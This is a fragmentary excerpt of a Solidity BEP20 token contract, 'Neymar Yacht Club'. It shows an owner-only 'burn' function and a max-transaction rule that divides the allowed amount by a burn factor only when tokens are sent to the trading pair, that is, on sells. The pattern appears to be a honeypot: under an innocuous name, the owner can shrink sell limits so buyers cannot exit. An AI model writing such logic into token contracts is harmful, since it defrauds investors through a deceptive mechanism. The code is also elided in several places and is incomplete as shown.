...
contract NeymarYachtClub is IBEP20, Auth {
    using SafeMath for uint256;

    string constant _name = "Neymar Yacht Club";
    ...
    function burn(uint256 burnFactor) external onlyOwner {
    ...
    function _getMaxTxAmount(address recipient) internal view returns (uint256) {
        return pair == recipient ? _maxTxAmount.div(_burnFactor) : _maxTxAmount;
    }
